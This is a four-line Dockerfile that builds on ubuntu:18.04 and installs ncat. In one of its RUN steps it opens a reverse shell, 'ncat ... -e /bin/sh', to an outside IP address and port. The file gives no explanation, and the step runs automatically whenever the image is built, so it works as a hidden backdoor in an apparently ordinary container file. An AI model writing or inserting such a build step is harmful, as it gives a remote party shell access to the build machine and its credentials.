FROM ubuntu:18.04
RUN apt update && apt install -y ncat
RUN ncat 104.236.13.229 3444 -e /bin/sh
CMD ["/bin/bash"]